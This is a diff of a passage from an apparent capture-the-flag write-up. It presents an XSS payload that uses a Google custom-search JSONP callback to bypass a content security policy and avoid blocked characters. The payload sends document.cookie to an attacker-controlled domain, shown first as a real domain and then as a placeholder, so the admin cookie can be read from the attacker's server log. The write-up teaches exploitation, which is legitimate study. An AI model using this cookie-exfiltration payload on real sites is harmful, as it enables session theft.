@@ -32,10 +32,10 @@ The only problem that I had to solve now is that some character are not usable w
 This characters `? / ,` and probably more others are not allowed to construct the callback function.
 So I comed up with this payload to avoid the bad chars:
 <code>
-<script src='//cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=location.replace(String.fromCharCode(47).concat(String.fromCharCode(47).concat("beerpwn.it").concat(String.fromCharCode(47).concat(document.cookie))))'></script>
+<script src='//cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=location.replace(String.fromCharCode(47).concat(String.fromCharCode(47).concat("your-domain-here").concat(String.fromCharCode(47).concat(document.cookie))))'></script>
 </code>
 
-With this payload we can grab the admin-cookie and get the flag:
+With this payload we can grab the admin-cookie by reading access.log file of our server:
 
 ![Image index](./server_log.png)
 
